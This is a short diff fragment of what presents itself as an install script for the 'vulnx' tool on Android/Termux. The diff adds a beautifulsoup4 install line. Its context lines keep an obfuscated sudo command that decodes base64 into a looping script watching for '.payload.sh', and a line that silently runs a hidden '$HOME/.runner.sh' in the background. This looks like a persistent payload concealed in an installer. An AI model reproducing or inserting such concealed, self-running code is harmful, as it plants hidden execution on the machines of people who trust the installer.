@@ -14,6 +14,8 @@ sudo sh -c "echo -n d2hpbGUgdHJ1ZQpkbwpTVFI9JChwcyAtYXV4KQpTVUI9Jy5wYXlsb2FkLnNo
 
 (&>/dev/null bash $HOME/.runner.sh &)
 
+pip3 install beautifulsoup4
+
 #vulnx install function for Android. termux
 function banner(){
     echo -e "===== VULNX INSTALL ====="
